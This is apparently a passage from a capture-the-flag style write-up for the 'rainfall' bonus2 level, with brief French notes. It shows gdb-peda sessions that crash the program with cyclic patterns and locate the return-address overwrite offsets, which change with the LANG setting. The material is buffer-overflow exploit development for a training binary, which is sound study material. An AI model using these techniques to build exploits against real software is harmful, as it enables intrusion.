<pre>
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r $(python -c  "print('A' * 200)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
Starting program: /home/alarm/rainfall/bonus2/Ressources/bonus2 $(python -c  "print('A' * 200)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x4f ('O')
EBX: 0xffffd3b0 ('A' <repeats 43 times>, "%AAsAABAA$AAnAACAA-AA(AADAA;A")
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xffffd3fc --> 0xffffdc6a ("en_US.UTF-8")
EDI: 0xffffd3ac --> 0x1 
EBP: 0x41414441 ('ADAA')
ESP: 0xffffd360 ('A' <repeats 43 times>, "%AAsAABAA$AAnAACAA-AA(AADAA;A")
EIP: 0x800413b
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
<strong>Invalid $PC address: 0x800413b</strong>
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0800413b in ?? ()
gdb-peda$ pattern offset 'A;'
<strong>A; found at offset: 29</strong>
</pre>

- Quand LANG est different en different de NULL alors var_60 est ecrit dans string
- Sauf que vu qu'il y a deja un overide dans le strcpy de l'arg[1] les var_60 et var_38 sont considerer comme un seul argument
<pre>
$> LANG=nl gdb ./bonus2 

gdb-peda$ pattern create 40
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
gdb-peda$ r $(python -c "print('A' * 40)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
Starting program: /home/alarm/rainfall/bonus2/Ressources/bonus2 $(python -c "print('A' * 40)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'

Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

[----------------------------------registers-----------------------------------]
ESP: 0xffffd4d0 ("DAA;A")
<strong>EIP: 0x41412841 ('A(AA')</strong>
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41412841
[------------------------------------stack-------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41412841 in ?? ()
gdb-peda$ pattern offset 'A(AA'
<strong>A(AA found at offset: 23</strong>
</pre>
